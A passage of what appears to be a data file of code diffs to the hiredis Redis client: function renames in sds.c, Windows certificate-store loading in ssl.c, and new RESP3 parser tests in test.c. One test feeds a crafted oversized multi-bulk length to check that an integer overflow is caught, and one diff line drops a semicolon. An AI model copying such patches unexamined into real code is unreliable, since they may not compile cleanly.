    \        /* unterminated quotes */\n                         goto err;\n     \
    \                } else {\n-                        current = hi_sdscatlen(current,p,1);\n\
    +                        current = sdscatlen(current,p,1);\n                 \
    \    }\n                 } else if (insq) {\n                     if (*p == '\\\
    \\' && *(p+1) == '\\'') {\n                         p++;\n-                  \
    \      current = hi_sdscatlen(current,\"'\",1);\n+                        current\
    \ = sdscatlen(current,\"'\",1);\n                     } else if (*p == '\\'')\
    \ {\n                         /* closing quote must be followed by a space or\n\
    \                          * nothing at all. */\n@@ -1002,7 +1002,7 @@ hisds *hi_sdssplitargs(const\
    \ char *line, int *argc) {\n                         /* unterminated quotes */\n\
    \                         goto err;\n                     } else {\n-        \
    \                current = hi_sdscatlen(current,p,1);\n+                     \
    \   current = sdscatlen(current,p,1);\n                     }\n              \
    \   } else {\n                     switch(*p) {\n@@ -1020,17 +1020,17 @@ hisds\
    \ *hi_sdssplitargs(const char *line, int *argc) {\n                         insq=1;\n\
    \                         break;\n                     default:\n-           \
    \             current = hi_sdscatlen(current,p,1);\n+                        current\
    \ = sdscatlen(current,p,1);\n                         break;\n               \
    \      }\n                 }\n                 if (*p) p++;\n             }\n\
    \             /* add the token to the vector */\n             {\n-           \
    \     char **new_vector = hi_s_realloc(vector,((*argc)+1)*sizeof(char*));\n+ \
    \               char **new_vector = s_realloc(vector,((*argc)+1)*sizeof(char*));\n\
    \                 if (new_vector == NULL) {\n-                    hi_s_free(vector);\n\
    +                    s_free(vector);\n                     return NULL;\n    \
    \             }\n \n@@ -1041,16 +1041,16 @@ hisds *hi_sdssplitargs(const char\
    \ *line, int *argc) {\n             }\n         } else {\n             /* Even\
    \ on empty input string return something not NULL. */\n-            if (vector\
    \ == NULL) vector = hi_s_malloc(sizeof(void*));\n+            if (vector == NULL)\
    \ vector = s_malloc(sizeof(void*));\n             return vector;\n         }\n\
    \     }\n \n err:\n     while((*argc)--)\n-        hi_sdsfree(vector[*argc]);\n\
    -    hi_s_free(vector);\n-    if (current) hi_sdsfree(current);\n+        sdsfree(vector[*argc]);\n\
    +    s_free(vector);\n+    if (current) sdsfree(current);\n     *argc = 0;\n \
    \    return NULL;\n }\n@@ -1059,13 +1059,13 @@ hisds *hi_sdssplitargs(const char\
    \ *line, int *argc) {\n  * characters specified in the 'from' string to the corresponding\
    \ character\n  * in the 'to' array.\n  *\n- * For instance: hi_sdsmapchars(mystring,\
    \ \"ho\", \"01\", 2)\n+ * For instance: sdsmapchars(mystring, \"ho\", \"01\",\
    \ 2)\n  * will have the effect of turning the string \"hello\" into \"0ell1\"\
    .\n  *\n- * The function returns the hisds string pointer, that is always the\
    \ same\n+ * The function returns the sds string pointer, that is always the same\n\
    \  * as the input pointer since no resize is needed. */\n-hisds hi_sdsmapchars(hisds\
    \ s, const char *from, const char *to, size_t setlen) {\n-    size_t j, i, l =\
    \ hi_sdslen(s);\n+sds sdsmapchars(sds s, const char *from, const char *to, size_t\
    \ setlen) {\n+    size_t j, i, l = sdslen(s);\n \n     for (j = 0; j < l; j++)\
    \ {\n         for (i = 0; i < setlen; i++) {\n@@ -1079,26 +1079,26 @@ hisds hi_sdsmapchars(hisds\
    \ s, const char *from, const char *to, size_t setlen) {\n }\n \n /* Join an array\
    \ of C strings using the specified separator (also a C string).\n- * Returns the\
    \ result as an hisds string. */\n-hisds hi_sdsjoin(char **argv, int argc, char\
    \ *sep) {\n-    hisds join = hi_sdsempty();\n+ * Returns the result as an sds\
    \ string. */\n+sds sdsjoin(char **argv, int argc, char *sep) {\n+    sds join\
    \ = sdsempty();\n     int j;\n \n     for (j = 0; j < argc; j++) {\n-        join\
    \ = hi_sdscat(join, argv[j]);\n-        if (j != argc-1) join = hi_sdscat(join,sep);\n\
    +        join = sdscat(join, argv[j]);\n+        if (j != argc-1) join = sdscat(join,sep);\n\
    \     }\n     return join;\n }\n \n-/* Like hi_sdsjoin, but joins an array of\
    \ SDS strings. */\n-hisds hi_sdsjoinsds(hisds *argv, int argc, const char *sep,\
    \ size_t seplen) {\n-    hisds join = hi_sdsempty();\n+/* Like sdsjoin, but joins\
    \ an array of SDS strings. */\n+sds sdsjoinsds(sds *argv, int argc, const char\
    \ *sep, size_t seplen) {\n+    sds join = sdsempty();\n     int j;\n \n     for\
    \ (j = 0; j < argc; j++) {\n-        join = hi_sdscatsds(join, argv[j]);\n-  \
    \      if (j != argc-1) join = hi_sdscatlen(join,sep,seplen);\n+        join =\
    \ sdscatsds(join, argv[j]);\n+        if (j != argc-1) join = sdscatlen(join,sep,seplen);\n\
    \     }\n     return join;\n }\n@@ -1108,182 +1108,182 @@ hisds hi_sdsjoinsds(hisds\
    \ *argv, int argc, const char *sep, size_t seplen) {\n  * the overhead of function\
    \ calls. Here we define these wrappers only for\n  * the programs SDS is linked\
    \ to, if they want to touch the SDS internals\n  * even if they use a different\
    \ allocator. */\n-void *hi_sds_malloc(size_t size) { return hi_s_malloc(size);\
    \ }\n-void *hi_sds_realloc(void *ptr, size_t size) { return hi_s_realloc(ptr,size);\
    \ }\n-void hi_sds_free(void *ptr) { hi_s_free(ptr); }\n+void *sds_malloc(size_t\
    \ size) { return s_malloc(size); }\n+void *sds_realloc(void *ptr, size_t size)\
    \ { return s_realloc(ptr,size); }\n+void sds_free(void *ptr) { s_free(ptr); }\n\
    \ \n-#if defined(HI_SDS_TEST_MAIN)\n+#if defined(SDS_TEST_MAIN)\n #include <stdio.h>\n\
    \ #include \"testhelp.h\"\n #include \"limits.h\"\n \n #define UNUSED(x) (void)(x)\n\
    -int hi_sdsTest(void) {\n+int sdsTest(void) {\n     {\n-        hisds x = hi_sdsnew(\"\
    foo\"), y;\n+        sds x = sdsnew(\"foo\"), y;\n \n         test_cond(\"Create\
    \ a string and obtain the length\",\n-            hi_sdslen(x) == 3 && memcmp(x,\"\
    foo\\0\",4) == 0)\n+            sdslen(x) == 3 && memcmp(x,\"foo\\0\",4) == 0)\n\
    \ \n-        hi_sdsfree(x);\n-        x = hi_sdsnewlen(\"foo\",2);\n+        sdsfree(x);\n\
    +        x = sdsnewlen(\"foo\",2);\n         test_cond(\"Create a string with\
    \ specified length\",\n-            hi_sdslen(x) == 2 && memcmp(x,\"fo\\0\",3)\
    \ == 0)\n+            sdslen(x) == 2 && memcmp(x,\"fo\\0\",3) == 0)\n \n-    \
    \    x = hi_sdscat(x,\"bar\");\n+        x = sdscat(x,\"bar\");\n         test_cond(\"\
    Strings concatenation\",\n-            hi_sdslen(x) == 5 && memcmp(x,\"fobar\\\
    0\",6) == 0);\n+            sdslen(x) == 5 && memcmp(x,\"fobar\\0\",6) == 0);\n\
    \ \n-        x = hi_sdscpy(x,\"a\");\n-        test_cond(\"hi_sdscpy() against\
    \ an originally longer string\",\n-            hi_sdslen(x) == 1 && memcmp(x,\"\
    a\\0\",2) == 0)\n+        x = sdscpy(x,\"a\");\n+        test_cond(\"sdscpy()\
    \ against an originally longer string\",\n+            sdslen(x) == 1 && memcmp(x,\"\
    a\\0\",2) == 0)\n \n-        x = hi_sdscpy(x,\"xyzxxxxxxxxxxyyyyyyyyyykkkkkkkkkk\"\
    );\n-        test_cond(\"hi_sdscpy() against an originally shorter string\",\n\
    -            hi_sdslen(x) == 33 &&\n+        x = sdscpy(x,\"xyzxxxxxxxxxxyyyyyyyyyykkkkkkkkkk\"\
    );\n+        test_cond(\"sdscpy() against an originally shorter string\",\n+ \
    \           sdslen(x) == 33 &&\n             memcmp(x,\"xyzxxxxxxxxxxyyyyyyyyyykkkkkkkkkk\\\
    0\",33) == 0)\n \n-        hi_sdsfree(x);\n-        x = hi_sdscatprintf(hi_sdsempty(),\"\
    %d\",123);\n-        test_cond(\"hi_sdscatprintf() seems working in the base case\"\
    ,\n-            hi_sdslen(x) == 3 && memcmp(x,\"123\\0\",4) == 0)\n+        sdsfree(x);\n\
    +        x = sdscatprintf(sdsempty(),\"%d\",123);\n+        test_cond(\"sdscatprintf()\
    \ seems working in the base case\",\n+            sdslen(x) == 3 && memcmp(x,\"\
    123\\0\",4) == 0)\n \n-        hi_sdsfree(x);\n-        x = hi_sdsnew(\"--\");\n\
    -        x = hi_sdscatfmt(x, \"Hello %s World %I,%I--\", \"Hi!\", LLONG_MIN,LLONG_MAX);\n\
    -        test_cond(\"hi_sdscatfmt() seems working in the base case\",\n-     \
    \       hi_sdslen(x) == 60 &&\n+        sdsfree(x);\n+        x = sdsnew(\"--\"\
    );\n+        x = sdscatfmt(x, \"Hello %s World %I,%I--\", \"Hi!\", LLONG_MIN,LLONG_MAX);\n\
    +        test_cond(\"sdscatfmt() seems working in the base case\",\n+        \
    \    sdslen(x) == 60 &&\n             memcmp(x,\"--Hello Hi! World -9223372036854775808,\"\
    \n                      \"9223372036854775807--\",60) == 0)\n         printf(\"\
    [%s]\\n\",x);\n \n-        hi_sdsfree(x);\n-        x = hi_sdsnew(\"--\");\n-\
    \        x = hi_sdscatfmt(x, \"%u,%U--\", UINT_MAX, ULLONG_MAX);\n-        test_cond(\"\
    hi_sdscatfmt() seems working with unsigned numbers\",\n-            hi_sdslen(x)\
    \ == 35 &&\n+        sdsfree(x);\n+        x = sdsnew(\"--\");\n+        x = sdscatfmt(x,\
    \ \"%u,%U--\", UINT_MAX, ULLONG_MAX);\n+        test_cond(\"sdscatfmt() seems\
    \ working with unsigned numbers\",\n+            sdslen(x) == 35 &&\n        \
    \     memcmp(x,\"--4294967295,18446744073709551615--\",35) == 0)\n \n-       \
    \ hi_sdsfree(x);\n-        x = hi_sdsnew(\" x \");\n-        hi_sdstrim(x,\" x\"\
    );\n-        test_cond(\"hi_sdstrim() works when all chars match\",\n-       \
    \     hi_sdslen(x) == 0)\n-\n-        hi_sdsfree(x);\n-        x = hi_sdsnew(\"\
    \ x \");\n-        hi_sdstrim(x,\" \");\n-        test_cond(\"hi_sdstrim() works\
    \ when a single char remains\",\n-            hi_sdslen(x) == 1 && x[0] == 'x')\n\
    -\n-        hi_sdsfree(x);\n-        x = hi_sdsnew(\"xxciaoyyy\");\n-        hi_sdstrim(x,\"\
    xy\");\n-        test_cond(\"hi_sdstrim() correctly trims characters\",\n-   \
    \         hi_sdslen(x) == 4 && memcmp(x,\"ciao\\0\",5) == 0)\n-\n-        y =\
    \ hi_sdsdup(x);\n-        hi_sdsrange(y,1,1);\n-        test_cond(\"hi_sdsrange(...,1,1)\"\
    ,\n-            hi_sdslen(y) == 1 && memcmp(y,\"i\\0\",2) == 0)\n-\n-        hi_sdsfree(y);\n\
    -        y = hi_sdsdup(x);\n-        hi_sdsrange(y,1,-1);\n-        test_cond(\"\
    hi_sdsrange(...,1,-1)\",\n-            hi_sdslen(y) == 3 && memcmp(y,\"iao\\0\"\
    ,4) == 0)\n-\n-        hi_sdsfree(y);\n-        y = hi_sdsdup(x);\n-        hi_sdsrange(y,-2,-1);\n\
    -        test_cond(\"hi_sdsrange(...,-2,-1)\",\n-            hi_sdslen(y) == 2\
    \ && memcmp(y,\"ao\\0\",3) == 0)\n-\n-        hi_sdsfree(y);\n-        y = hi_sdsdup(x);\n\
    -        hi_sdsrange(y,2,1);\n-        test_cond(\"hi_sdsrange(...,2,1)\",\n-\
    \            hi_sdslen(y) == 0 && memcmp(y,\"\\0\",1) == 0)\n-\n-        hi_sdsfree(y);\n\
    -        y = hi_sdsdup(x);\n-        hi_sdsrange(y,1,100);\n-        test_cond(\"\
    hi_sdsrange(...,1,100)\",\n-            hi_sdslen(y) == 3 && memcmp(y,\"iao\\\
    0\",4) == 0)\n-\n-        hi_sdsfree(y);\n-        y = hi_sdsdup(x);\n-      \
    \  hi_sdsrange(y,100,100);\n-        test_cond(\"hi_sdsrange(...,100,100)\",\n\
    -            hi_sdslen(y) == 0 && memcmp(y,\"\\0\",1) == 0)\n-\n-        hi_sdsfree(y);\n\
    -        hi_sdsfree(x);\n-        x = hi_sdsnew(\"foo\");\n-        y = hi_sdsnew(\"\
    foa\");\n-        test_cond(\"hi_sdscmp(foo,foa)\", hi_sdscmp(x,y) > 0)\n-\n-\
    \        hi_sdsfree(y);\n-        hi_sdsfree(x);\n-        x = hi_sdsnew(\"bar\"\
    );\n-        y = hi_sdsnew(\"bar\");\n-        test_cond(\"hi_sdscmp(bar,bar)\"\
    , hi_sdscmp(x,y) == 0)\n-\n-        hi_sdsfree(y);\n-        hi_sdsfree(x);\n\
    -        x = hi_sdsnew(\"aar\");\n-        y = hi_sdsnew(\"bar\");\n-        test_cond(\"\
    hi_sdscmp(bar,bar)\", hi_sdscmp(x,y) < 0)\n-\n-        hi_sdsfree(y);\n-     \
    \   hi_sdsfree(x);\n-        x = hi_sdsnewlen(\"\\a\\n\\0foo\\r\",7);\n-     \
    \   y = hi_sdscatrepr(hi_sdsempty(),x,hi_sdslen(x));\n-        test_cond(\"hi_sdscatrepr(...data...)\"\
    ,\n+        sdsfree(x);\n+        x = sdsnew(\" x \");\n+        sdstrim(x,\"\
    \ x\");\n+        test_cond(\"sdstrim() works when all chars match\",\n+     \
    \       sdslen(x) == 0)\n+\n+        sdsfree(x);\n+        x = sdsnew(\" x \"\
    );\n+        sdstrim(x,\" \");\n+        test_cond(\"sdstrim() works when a single\
    \ char remains\",\n+            sdslen(x) == 1 && x[0] == 'x')\n+\n+        sdsfree(x);\n\
    +        x = sdsnew(\"xxciaoyyy\");\n+        sdstrim(x,\"xy\");\n+        test_cond(\"\
    sdstrim() correctly trims characters\",\n+            sdslen(x) == 4 && memcmp(x,\"\
    ciao\\0\",5) == 0)\n+\n+        y = sdsdup(x);\n+        sdsrange(y,1,1);\n+ \
    \       test_cond(\"sdsrange(...,1,1)\",\n+            sdslen(y) == 1 && memcmp(y,\"\
    i\\0\",2) == 0)\n+\n+        sdsfree(y);\n+        y = sdsdup(x);\n+        sdsrange(y,1,-1);\n\
    +        test_cond(\"sdsrange(...,1,-1)\",\n+            sdslen(y) == 3 && memcmp(y,\"\
    iao\\0\",4) == 0)\n+\n+        sdsfree(y);\n+        y = sdsdup(x);\n+       \
    \ sdsrange(y,-2,-1);\n+        test_cond(\"sdsrange(...,-2,-1)\",\n+         \
    \   sdslen(y) == 2 && memcmp(y,\"ao\\0\",3) == 0)\n+\n+        sdsfree(y);\n+\
    \        y = sdsdup(x);\n+        sdsrange(y,2,1);\n+        test_cond(\"sdsrange(...,2,1)\"\
    ,\n+            sdslen(y) == 0 && memcmp(y,\"\\0\",1) == 0)\n+\n+        sdsfree(y);\n\
    +        y = sdsdup(x);\n+        sdsrange(y,1,100);\n+        test_cond(\"sdsrange(...,1,100)\"\
    ,\n+            sdslen(y) == 3 && memcmp(y,\"iao\\0\",4) == 0)\n+\n+        sdsfree(y);\n\
    +        y = sdsdup(x);\n+        sdsrange(y,100,100);\n+        test_cond(\"\
    sdsrange(...,100,100)\",\n+            sdslen(y) == 0 && memcmp(y,\"\\0\",1) ==\
    \ 0)\n+\n+        sdsfree(y);\n+        sdsfree(x);\n+        x = sdsnew(\"foo\"\
    );\n+        y = sdsnew(\"foa\");\n+        test_cond(\"sdscmp(foo,foa)\", sdscmp(x,y)\
    \ > 0)\n+\n+        sdsfree(y);\n+        sdsfree(x);\n+        x = sdsnew(\"\
    bar\");\n+        y = sdsnew(\"bar\");\n+        test_cond(\"sdscmp(bar,bar)\"\
    , sdscmp(x,y) == 0)\n+\n+        sdsfree(y);\n+        sdsfree(x);\n+        x\
    \ = sdsnew(\"aar\");\n+        y = sdsnew(\"bar\");\n+        test_cond(\"sdscmp(bar,bar)\"\
    , sdscmp(x,y) < 0)\n+\n+        sdsfree(y);\n+        sdsfree(x);\n+        x\
    \ = sdsnewlen(\"\\a\\n\\0foo\\r\",7);\n+        y = sdscatrepr(sdsempty(),x,sdslen(x));\n\
    +        test_cond(\"sdscatrepr(...data...)\",\n             memcmp(y,\"\\\"\\\
    \\a\\\\n\\\\x00foo\\\\r\\\"\",15) == 0)\n \n         {\n             unsigned\
    \ int oldfree;\n             char *p;\n             int step = 10, j, i;\n \n\
    -            hi_sdsfree(x);\n-            hi_sdsfree(y);\n-            x = hi_sdsnew(\"\
    0\");\n-            test_cond(\"hi_sdsnew() free/len buffers\", hi_sdslen(x) ==\
    \ 1 && hi_sdsavail(x) == 0);\n+            sdsfree(x);\n+            sdsfree(y);\n\
    +            x = sdsnew(\"0\");\n+            test_cond(\"sdsnew() free/len buffers\"\
    , sdslen(x) == 1 && sdsavail(x) == 0);\n \n             /* Run the test a few\
    \ times in order to hit the first two\n              * SDS header types. */\n\
    \             for (i = 0; i < 10; i++) {\n-                int oldlen = hi_sdslen(x);\n\
    -                x = hi_sdsMakeRoomFor(x,step);\n-                int type = x[-1]&HI_SDS_TYPE_MASK;\n\
    -\n-                test_cond(\"sdsMakeRoomFor() len\", hi_sdslen(x) == oldlen);\n\
    -                if (type != HI_SDS_TYPE_5) {\n-                    test_cond(\"\
    hi_sdsMakeRoomFor() free\", hi_sdsavail(x) >= step);\n-                    oldfree\
    \ = hi_sdsavail(x);\n+                int oldlen = sdslen(x);\n+             \
    \   x = sdsMakeRoomFor(x,step);\n+                int type = x[-1]&SDS_TYPE_MASK;\n\
    +\n+                test_cond(\"sdsMakeRoomFor() len\", sdslen(x) == oldlen);\n\
    +                if (type != SDS_TYPE_5) {\n+                    test_cond(\"\
    sdsMakeRoomFor() free\", sdsavail(x) >= step);\n+                    oldfree =\
    \ sdsavail(x);\n                 }\n                 p = x+oldlen;\n         \
    \        for (j = 0; j < step; j++) {\n                     p[j] = 'A'+j;\n  \
    \               }\n-                hi_sdsIncrLen(x,step);\n+                sdsIncrLen(x,step);\n\
    \             }\n-            test_cond(\"hi_sdsMakeRoomFor() content\",\n+  \
    \          test_cond(\"sdsMakeRoomFor() content\",\n                 memcmp(\"\
    0ABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJ\"\
    ,x,101) == 0);\n-            test_cond(\"sdsMakeRoomFor() final length\",hi_sdslen(x)==101);\n\
    +            test_cond(\"sdsMakeRoomFor() final length\",sdslen(x)==101);\n \n\
    -            hi_sdsfree(x);\n+            sdsfree(x);\n         }\n     }\n- \
    \   test_report();\n+    test_report()\n     return 0;\n }\n #endif\n \n-#ifdef\
    \ HI_SDS_TEST_MAIN\n+#ifdef SDS_TEST_MAIN\n int main(void) {\n-    return hi_sdsTest();\n\
    +    return sdsTest();\n }\n #endif"
  - "--- a/ssl.c\n+++ b/ssl.c\n@@ -38,6 +38,7 @@\n #include <string.h>\n #ifdef _WIN32\n\
    \ #include <windows.h>\n+#include <wincrypt.h>\n #else\n #include <pthread.h>\n\
    \ #endif\n@@ -182,6 +183,10 @@ const char *redisSSLContextGetError(redisSSLContextError\
    \ error)\n             return \"Failed to load client certificate\";\n       \
    \  case REDIS_SSL_CTX_PRIVATE_KEY_LOAD_FAILED:\n             return \"Failed to\
    \ load private key\";\n+        case REDIS_SSL_CTX_OS_CERTSTORE_OPEN_FAILED:\n\
    +            return \"Failed to open system certifcate store\";\n+        case\
    \ REDIS_SSL_CTX_OS_CERT_ADD_FAILED:\n+            return \"Failed to add CA certificates\
    \ obtained from system to the SSL context\";\n         default:\n            \
    \ return \"Unknown error code\";\n     }\n@@ -214,6 +219,11 @@ redisSSLContext\
    \ *redisCreateSSLContext(const char *cacert_filename, const char *\n         const\
    \ char *cert_filename, const char *private_key_filename,\n         const char\
    \ *server_name, redisSSLContextError *error)\n {\n+#ifdef _WIN32\n+    HCERTSTORE\
    \ win_store = NULL;\n+    PCCERT_CONTEXT win_ctx = NULL;\n+#endif\n+\n     redisSSLContext\
    \ *ctx = hi_calloc(1, sizeof(redisSSLContext));\n     if (ctx == NULL)\n     \
    \    goto error;\n@@ -234,6 +244,31 @@ redisSSLContext *redisCreateSSLContext(const\
    \ char *cacert_filename, const char *\n     }\n \n     if (capath || cacert_filename)\
    \ {\n+#ifdef _WIN32\n+        if (0 == strcmp(cacert_filename, \"wincert\")) {\n\
    +            win_store = CertOpenSystemStore(NULL, \"Root\");\n+            if\
    \ (!win_store) {\n+                if (error) *error = REDIS_SSL_CTX_OS_CERTSTORE_OPEN_FAILED;\n\
    +                goto error;\n+            }\n+            X509_STORE* store =\
    \ SSL_CTX_get_cert_store(ctx->ssl_ctx);\n+            while (win_ctx = CertEnumCertificatesInStore(win_store,\
    \ win_ctx)) {\n+                X509* x509 = NULL;\n+                x509 = d2i_X509(NULL,\
    \ (const unsigned char**)&win_ctx->pbCertEncoded, win_ctx->cbCertEncoded);\n+\
    \                if (x509) {\n+                    if ((1 != X509_STORE_add_cert(store,\
    \ x509)) ||\n+                        (1 != SSL_CTX_add_client_CA(ctx->ssl_ctx,\
    \ x509)))\n+                    {\n+                        if (error) *error\
    \ = REDIS_SSL_CTX_OS_CERT_ADD_FAILED;\n+                        goto error;\n\
    +                    }\n+                    X509_free(x509);\n+             \
    \   }\n+            }\n+            CertFreeCertificateContext(win_ctx);\n+  \
    \          CertCloseStore(win_store, 0);\n+        } else\n+#endif\n         if\
    \ (!SSL_CTX_load_verify_locations(ctx->ssl_ctx, cacert_filename, capath)) {\n\
    \             if (error) *error = REDIS_SSL_CTX_CA_CERT_LOAD_FAILED;\n       \
    \      goto error;\n@@ -257,6 +292,10 @@ redisSSLContext *redisCreateSSLContext(const\
    \ char *cacert_filename, const char *\n     return ctx;\n \n error:\n+#ifdef _WIN32\n\
    +    CertFreeCertificateContext(win_ctx);\n+    CertCloseStore(win_store, 0);\n\
    +#endif\n     redisFreeSSLContext(ctx);\n     return NULL;\n }\n@@ -353,7 +392,11\
    \ @@ int redisInitiateSSLWithContext(redisContext *c, redisSSLContext *redis_ssl_ctx)\n\
    \         }\n     }\n \n-    return redisSSLConnect(c, ssl);\n+    if (redisSSLConnect(c,\
    \ ssl) != REDIS_OK) {\n+        goto error;\n+    }\n+\n+    return REDIS_OK;\n\
    \ \n error:\n     if (ssl)\n@@ -437,7 +480,7 @@ static ssize_t redisSSLRead(redisContext\
    \ *c, char *buf, size_t bufcap) {\n static ssize_t redisSSLWrite(redisContext\
    \ *c) {\n     redisSSL *rssl = c->privctx;\n \n-    size_t len = rssl->lastLen\
    \ ? rssl->lastLen : hi_sdslen(c->obuf);\n+    size_t len = rssl->lastLen ? rssl->lastLen\
    \ : sdslen(c->obuf);\n     int rv = SSL_write(rssl->ssl, c->obuf, len);\n \n \
    \    if (rv > 0) {"
  - "--- a/test.c\n+++ b/test.c\n@@ -11,12 +11,17 @@\n #include <signal.h>\n #include\
    \ <errno.h>\n #include <limits.h>\n+#include <math.h>\n \n #include \"hiredis.h\"\
    \n #include \"async.h\"\n #ifdef HIREDIS_TEST_SSL\n #include \"hiredis_ssl.h\"\
    \n #endif\n+#ifdef HIREDIS_TEST_ASYNC\n+#include \"adapters/libevent.h\"\n+#include\
    \ <event2/event.h>\n+#endif\n #include \"net.h\"\n #include \"win32.h\"\n \n@@\
    \ -53,6 +58,13 @@ struct privdata {\n     int dtor_counter;\n };\n \n+struct pushCounters\
    \ {\n+    int nil;\n+    int str;\n+};\n+\n+static int insecure_calloc_calls;\n\
    +\n #ifdef HIREDIS_TEST_SSL\n redisSSLContext *_ssl_ctx = NULL;\n #endif\n@@ -340,21\
    \ +352,21 @@ static void test_format_commands(void) {\n         len == 4+4+(3+2)+4+(7+2)+4+(3+2));\n\
    \     hi_free(cmd);\n \n-    hisds sds_cmd;\n+    sds sds_cmd;\n \n     sds_cmd\
    \ = NULL;\n-    test(\"Format command into hisds by passing argc/argv without\
    \ lengths: \");\n+    test(\"Format command into sds by passing argc/argv without\
    \ lengths: \");\n     len = redisFormatSdsCommandArgv(&sds_cmd,argc,argv,NULL);\n\
    \     test_cond(strncmp(sds_cmd,\"*3\\r\\n$3\\r\\nSET\\r\\n$3\\r\\nfoo\\r\\n$3\\\
    r\\nbar\\r\\n\",len) == 0 &&\n         len == 4+4+(3+2)+4+(3+2)+4+(3+2));\n- \
    \   hi_sdsfree(sds_cmd);\n+    sdsfree(sds_cmd);\n \n     sds_cmd = NULL;\n- \
    \   test(\"Format command into hisds by passing argc/argv with lengths: \");\n\
    +    test(\"Format command into sds by passing argc/argv with lengths: \");\n\
    \     len = redisFormatSdsCommandArgv(&sds_cmd,argc,argv,lens);\n     test_cond(strncmp(sds_cmd,\"\
    *3\\r\\n$3\\r\\nSET\\r\\n$7\\r\\nfoo\\0xxx\\r\\n$3\\r\\nbar\\r\\n\",len) == 0\
    \ &&\n         len == 4+4+(3+2)+4+(7+2)+4+(3+2));\n-    hi_sdsfree(sds_cmd);\n\
    +    sdsfree(sds_cmd);\n }\n \n static void test_append_formatted_commands(struct\
    \ config config) {\n@@ -493,6 +505,20 @@ static void test_reply_reader(void) {\n\
    \     freeReplyObject(reply);\n     redisReaderFree(reader);\n \n+    test(\"\
    Multi-bulk never overflows regardless of maxelements: \");\n+    size_t bad_mbulk_len\
    \ = (SIZE_MAX / sizeof(void *)) + 3;\n+    char bad_mbulk_reply[100];\n+    snprintf(bad_mbulk_reply,\
    \ sizeof(bad_mbulk_reply), \"*%llu\\r\\n+asdf\\r\\n\",\n+        (unsigned long\
    \ long) bad_mbulk_len);\n+\n+    reader = redisReaderCreate();\n+    reader->maxelements\
    \ = 0;    /* Don't rely on default limit */\n+    redisReaderFeed(reader, bad_mbulk_reply,\
    \ strlen(bad_mbulk_reply));\n+    ret = redisReaderGetReply(reader,&reply);\n\
    +    test_cond(ret == REDIS_ERR && strcasecmp(reader->errstr, \"Out of memory\"\
    ) == 0);\n+    freeReplyObject(reply);\n+    redisReaderFree(reader);\n+\n #if\
    \ LLONG_MAX > SIZE_MAX\n     test(\"Set error when array > SIZE_MAX: \");\n  \
    \   reader = redisReaderCreate();\n@@ -578,6 +604,147 @@ static void test_reply_reader(void)\
    \ {\n         ((redisReply*)reply)->element[1]->integer == 42);\n     freeReplyObject(reply);\n\
    \     redisReaderFree(reader);\n+\n+    test(\"Can parse RESP3 doubles: \");\n\
    +    reader = redisReaderCreate();\n+    redisReaderFeed(reader, \",3.14159265358979323846\\\
    r\\n\",25);\n+    ret = redisReaderGetReply(reader,&reply);\n+    test_cond(ret\
    \ == REDIS_OK &&\n+              ((redisReply*)reply)->type == REDIS_REPLY_DOUBLE\
    \ &&\n+              fabs(((redisReply*)reply)->dval - 3.14159265358979323846)\
    \ < 0.00000001 &&\n+              ((redisReply*)reply)->len == 22 &&\n+      \
    \        strcmp(((redisReply*)reply)->str, \"3.14159265358979323846\") == 0);\n\
    +    freeReplyObject(reply);\n+    redisReaderFree(reader);\n+\n+    test(\"Set\
    \ error on invalid RESP3 double: \");\n+    reader = redisReaderCreate();\n+ \
    \   redisReaderFeed(reader, \",3.14159\\000265358979323846\\r\\n\",26);\n+   \
    \ ret = redisReaderGetReply(reader,&reply);\n+    test_cond(ret == REDIS_ERR &&\n\
    +              strcasecmp(reader->errstr,\"Bad double value\") == 0);\n+    freeReplyObject(reply);\n\
    +    redisReaderFree(reader);\n+\n+    test(\"Correctly parses RESP3 double INFINITY:\
    \ \");\n+    reader = redisReaderCreate();\n+    redisReaderFeed(reader, \",inf\\\
    r\\n\",6);\n+    ret = redisReaderGetReply(reader,&reply);\n+    test_cond(ret\
    \ == REDIS_OK &&\n+              ((redisReply*)reply)->type == REDIS_REPLY_DOUBLE\
    \ &&\n+              isinf(((redisReply*)reply)->dval) &&\n+              ((redisReply*)reply)->dval\
    \ > 0);\n+    freeReplyObject(reply);\n+    redisReaderFree(reader);\n+\n+   \
    \ test(\"Set error when RESP3 double is NaN: \");\n+    reader = redisReaderCreate();\n\
    +    redisReaderFeed(reader, \",nan\\r\\n\",6);\n+    ret = redisReaderGetReply(reader,&reply);\n\
    +    test_cond(ret == REDIS_ERR &&\n+              strcasecmp(reader->errstr,\"\
    Bad double value\") == 0);\n+    freeReplyObject(reply);\n+    redisReaderFree(reader);\n\
    +\n+    test(\"Can parse RESP3 nil: \");\n+    reader = redisReaderCreate();\n\
    +    redisReaderFeed(reader, \"_\\r\\n\",3);\n+    ret = redisReaderGetReply(reader,&reply);\n\
    +    test_cond(ret == REDIS_OK &&\n+              ((redisReply*)reply)->type ==\
    \ REDIS_REPLY_NIL);\n+    freeReplyObject(reply);\n+    redisReaderFree(reader);\n\
    +\n+    test(\"Set error on invalid RESP3 nil: \");\n+    reader = redisReaderCreate();\n\
    +    redisReaderFeed(reader, \"_nil\\r\\n\",6);\n+    ret = redisReaderGetReply(reader,&reply);\n\
    +    test_cond(ret == REDIS_ERR &&\n+              strcasecmp(reader->errstr,\"\
    Bad nil value\") == 0);\n+    freeReplyObject(reply);\n+    redisReaderFree(reader);\n\
    +\n+    test(\"Can parse RESP3 bool (true): \");\n+    reader = redisReaderCreate();\n\
    +    redisReaderFeed(reader, \"#t\\r\\n\",4);\n+    ret = redisReaderGetReply(reader,&reply);\n\
    +    test_cond(ret == REDIS_OK &&\n+              ((redisReply*)reply)->type ==\
    \ REDIS_REPLY_BOOL &&\n+              ((redisReply*)reply)->integer);\n+    freeReplyObject(reply);\n\
    +    redisReaderFree(reader);\n+\n+    test(\"Can parse RESP3 bool (false): \"\
    );\n+    reader = redisReaderCreate();\n+    redisReaderFeed(reader, \"#f\\r\\\
    n\",4);\n+    ret = redisReaderGetReply(reader,&reply);\n+    test_cond(ret ==\
    \ REDIS_OK &&\n+              ((redisReply*)reply)->type == REDIS_REPLY_BOOL &&\n\
    +              !((redisReply*)reply)->integer);\n+    freeReplyObject(reply);\n\
    +    redisReaderFree(reader);\n+\n+    test(\"Set error on invalid RESP3 bool:\
    \ \");\n+    reader = redisReaderCreate();\n+    redisReaderFeed(reader, \"#foobar\\\
    r\\n\",9);\n+    ret = redisReaderGetReply(reader,&reply);\n+    test_cond(ret\
